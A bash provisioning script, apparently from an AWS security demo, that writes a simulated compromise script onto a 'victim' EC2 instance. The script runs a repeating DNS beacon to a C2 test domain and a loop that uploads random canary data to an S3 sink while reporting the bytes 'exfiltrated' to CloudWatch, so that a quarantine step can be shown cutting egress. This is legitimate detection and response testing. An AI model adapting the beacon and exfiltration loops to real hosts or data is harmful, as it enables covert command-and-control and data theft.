#!/bin/bash
# Victim host. Writes the beacon and the exfiltration loop; runs neither. Both are started by an SSM command from .github/workflows/agent-custodian.yml.
#
# Amazon Linux 2023 already ships curl, aws, jq and dig, so this installs
# nothing. An earlier version ran "dnf install -y curl", which conflicts with
# the preinstalled curl-minimal; under set -e that aborted user-data before it
# had written anything, and the failure was invisible until a demo command
# found no script to run.
#
# Two rules follow from that, and both are worth keeping:
#   1. Install nothing that is already present.
#   2. Write the payload FIRST, so that anything which fails later cannot
#      leave the host without its scripts.
set -uo pipefail

cat > /opt/compromise.sh <<'COMPROMISE'
#!/bin/bash
# Two things happen at once, exactly as they would in a real intrusion.
#
# 1. A DNS beacon to AWS's documented GuardDuty test domain. This produces a
#    genuine Backdoor:EC2/C&CActivity.B!DNS finding from the real detector --
#    not a sample finding, not an injected event. The domain resolves to a
#    sinkhole and carries no payload.
#
# 2. A steady exfiltration of a synthetic canary dataset. This is what the
#    scoreboard measures. It stops only when something removes this host's
#    egress -- which is what quarantine does.
set -uo pipefail

TWIN="${twin}"
SINK="${sink_bucket}"
NS="${metric_namespace}"
REGION="${region}"
CHUNK=${egress_bytes}

# The beacon. Repeated because detection is not instantaneous.
beacon() {
  while true; do
    dig +short "${c2_domain}" >/dev/null 2>&1 || true
    sleep 5
  done
}
beacon &

# The payload. Synthetic, generated here, never anything real.
i=0
total=0
while true; do
  i=$((i + 1))
  head -c "$CHUNK" /dev/urandom | base64 > /tmp/chunk

  # A failed upload is the containment working. Keep the counter honest: only
  # count what actually left the host.
  if aws s3 cp /tmp/chunk "s3://$SINK/$TWIN/chunk-$i" --region "$REGION" >/dev/null 2>&1; then
    total=$((total + CHUNK))
    # One-second storage resolution. At the default 60s the counter only
    # moves once a minute and jumps by a megabyte, which reads as a board
    # refreshing badly rather than a machine leaking steadily.
    aws cloudwatch put-metric-data \
      --region "$REGION" \
      --namespace "$NS" \
      --metric-name BytesExfiltrated \
      --dimensions Twin="$TWIN" \
      --storage-resolution 1 \
      --value "$total" >/dev/null 2>&1 || true
  fi

  sleep 2
done
COMPROMISE

chmod +x /opt/compromise.sh
